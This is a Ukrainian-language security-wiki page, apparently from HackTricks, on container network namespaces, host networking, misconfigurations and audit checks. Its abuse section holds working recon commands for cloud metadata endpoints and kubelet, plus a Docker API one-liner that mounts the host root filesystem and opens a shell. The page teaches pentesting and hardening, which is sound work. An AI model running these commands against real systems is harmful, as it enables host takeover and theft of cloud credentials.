# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює мережеві ресурси, такі як інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила брандмауера, сокети та вміст файлів на кшталт `/proc/net`. Саме тому контейнер може мати те, що виглядає як власний `eth0`, власні локальні маршрути і власний loopback-пристрій, не володіючи реальним мережевим стеком хоста.

З точки зору безпеки, це важливо, бо ізоляція мережі — це не лише прив'язка портів. Приватний мережевий простір імен обмежує те, що робоче навантаження може безпосередньо спостерігати або переналаштовувати. Якщо цей простір імен спільний з хостом, контейнер може раптово отримати видимість хостових прослуховувачів, локальних сервісів хоста та мережевих контрольних точок, які ніколи не мали бути доступні застосунку.

## Принцип роботи

Щойно створений мережевий простір імен починається з пустого або майже пустого мережевого середовища, поки до нього не підключать інтерфейси. Контейнерні runtime потім створюють або підключають віртуальні інтерфейси, призначають адреси та налаштовують маршрути, щоб навантаження мало очікувану підключеність. У розгортаннях на базі bridge це зазвичай означає, що контейнер бачить veth-backed інтерфейс, підключений до host bridge. У Kubernetes плагіни CNI виконують еквівалентну настройку для мережі Pod.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` — така радикальна зміна. Замість отримання підготовленого приватного мережевого стеку, навантаження приєднується до фактичного стеку хоста.

## Лабораторна

Ви можете побачити практично порожній мережевий простір імен за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
І ви можете порівняти звичайні та host-networked контейнери за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер, що використовує host networking, більше не має власного ізольованого огляду сокетів і інтерфейсів. Це зміна вже сама по собі значна ще до того, як ви почнете питати, які capabilities має процес.

## Використання під час виконання

Docker і Podman зазвичай створюють приватний network namespace для кожного container, якщо не налаштовано інакше. Kubernetes зазвичай дає кожному Pod власний network namespace, який спільно використовується контейнерами всередині Pod, але відокремлений від хоста. Incus/LXC системи також забезпечують широку ізоляцію на основі network-namespace, часто з більш різноманітними віртуальними мережевими налаштуваннями.

Загальний принцип полягає в тому, що приватна мережа за замовчуванням є межею ізоляції, тоді як host networking — це явне відмовлення від цієї межі.

## Неправильні налаштування

Найважливіша неправильна конфігурація — це просте спільне використання network namespace хоста. Це іноді роблять для продуктивності, низькорівневого моніторингу або зручності, але це знімає одну з найчистіших меж, доступних контейнерам. Локальні на хості слухачі стають доступнішими, служби, доступні лише з localhost, можуть стати досяжними, а можливості, такі як `CAP_NET_ADMIN` або `CAP_NET_RAW`, стають значно небезпечнішими, тому що операції, які вони дозволяють, тепер застосовуються до мережевого оточення самого хоста.

Ще одна проблема — надмірне надання мережевих capabilities навіть коли network namespace приватний. Приватний namespace допомагає, але не робить raw sockets або розширене керування мережею безпечними.

## Зловживання

У слабо ізольованих конфігураціях атакувальники можуть інспектувати служби, що слухають на хості, отримувати доступ до management endpoints, прив’язаних лише до loopback, прослуховувати або втручатися в трафік залежно від наявних capabilities та оточення, або перебудовувати маршрутизацію і стан firewall, якщо присутній `CAP_NET_ADMIN`. У кластері це також може полегшити латеральний рух і розвідку control-plane.

Якщо ви підозрюєте host networking, почніть з підтвердження того, що видимі інтерфейси та слухачі належать хосту, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Служби, доступні лише через loopback, часто є першим цікавим виявленням:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Якщо присутні мережеві можливості, перевірте, чи може робоче навантаження переглядати або змінювати видимий стек:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
У кластерних або хмарних середовищах мережеві налаштування хоста також виправдовують швидку локальну recon метаданих і сервісів, суміжних із control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Повний приклад: хостова мережа + локальний runtime / доступ до Kubelet

Хостова мережа не дає автоматичного доступу до root на хості, але часто відкриває сервіси, до яких навмисне можна дістатися лише з самого вузла. Якщо один із таких сервісів слабко захищений, хостова мережа стає прямим шляхом ескалації привілеїв.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Вплив:

- безпосереднє скомпрометування хоста, якщо локальний runtime API виставлено без належного захисту
- розвідка кластера або латеральне переміщення, якщо kubelet або локальні агенти доступні
- маніпуляція трафіком або відмова в обслуговуванні у поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — з'ясувати, чи процес має приватний мережевий стек, які маршрути та слухачі видимі, і чи мережевий вигляд уже нагадує хостовий ще до того, як ви почнете тестувати capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Якщо ідентифікатор network namespace або видимий набір інтерфейсів виглядає як на хості, host networking може вже використовуватися.
- `ss -lntup` особливо цінна, оскільки вона виявляє loopback-only listeners і локальні endpoints управління.
- Маршрути, імена інтерфейсів та контекст фаєрволу стають набагато важливішими, якщо присутні `CAP_NET_ADMIN` або `CAP_NET_RAW`.

При перегляді контейнера завжди оцінюйте network namespace разом із capability set. Host networking у поєднанні з потужними мережевими capabilities — зовсім інша позиція, ніж bridge networking із вузьким дефолтним capability set.
